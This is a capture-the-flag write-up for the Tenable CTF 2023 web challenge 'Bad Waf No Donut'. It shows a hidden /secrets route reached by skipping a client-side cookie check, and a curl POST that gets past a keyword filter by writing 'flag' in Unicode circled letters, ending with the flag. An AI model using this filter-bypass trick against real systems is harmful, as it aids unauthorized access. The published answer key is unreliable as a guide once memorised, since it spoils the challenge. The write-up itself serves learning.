# Tenable Capture the Flag 2023

## Bad Waf No Donut

> I made a simple little backdoor into my network to test some things. Let me know if you find any problems with it.
>
>  Author: N/A
>

Tags: _web_

## Solution
The webapp given for this challenge has a simple list of links on the main page.

```
Ｗｅｌｃｏｍｅ！
𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐞𝐥𝐞𝐜𝐭 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧:

Explore
Render site
Check connection
```

None of the links brings very interesting results. But the html source of `Explore` has something:

```html

<html>
<body>

    <h1>Explore</h1>
    <div id="content">

    </div>
    
</body>
<script>
function isAdmin() {
  let cookie = decodeURIComponent(document.cookie);
  let cookie_values = cookie.split(';');
  for(let i = 0; i <cookie_values.length; i++) {
    let c = cookie_values[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf("admin") == 0) {
      if (c.substring(name.length, c.length).indexOf("true")) { return true; }
    }
  }
  return false;
}
if (isAdmin()){
    document.getElementById("content").innerHTML = '<a href="/secrets">secrets</a>';
}
else {
    document.getElementById("content").innerHTML = '<ul><li><a href="/books">books</a></li><li><a href="/cats">cats</a></li><li><a href="/shopping_list">shopping list</a></li></ul>';
}
</script>
</html>
```

There is a route `/secrets` which is shown if a `admin` cookie is present. We don't need the cookie, we can just navigate to secrets and are greetet with:

```
🅢🅔🅒🅡🅔🅣🅢
I only know one secret, but you gotta know how to ask.
```

Checking the code again we find another hint:
```html
<html>
<body>

    <h1>🅢🅔🅒🅡🅔🅣🅢</h1>
    <p>I only know one secret, but you gotta know how to ask.</p>
    <!-- Try asking with a "secret_name" post parameter -->
    
</body>
</html>
```

Sending queries like are gettings answered with this smiley, not very helpful. 
```bash
$ curl -X POST https://nessus-badwaf.chals.io/secrets -H "Content-Type: application/x-www-form-urlencoded" -d "secret_name=flag_please"
🤐
```

But after just entering the word `flag`, the response is a bit more descriptive. Apparently the word is correct, but not asked in *the right way*. But what's the right way? The server gives back smileys which are unicode characters. Sending a flag character didn't do the trick.
```bash
$ curl -X POST https://nessus-badwaf.chals.io/secrets -H "Content-Type: application/x-www-form-urlencoded" -d "secret_name=flag"
🤐You know what to ask for, but you're not asking correctly.
```

But on the secrets page another hint is given: 🅢🅔🅒🅡🅔🅣🅢. Maybe `flag` needs the be written in the same fashion? After trying out a few variants this one worked:

```bash
$ curl -X POST https://nessus-badwaf.chals.io/secrets -H "Content-Type: application/x-www-form-urlencoded" -d "secret_
name=ⓕⓛⓐⓖ"
flag{h0w_d0es_this_even_w0rk}
```

Flag `flag{h0w_d0es_this_even_w0rk}`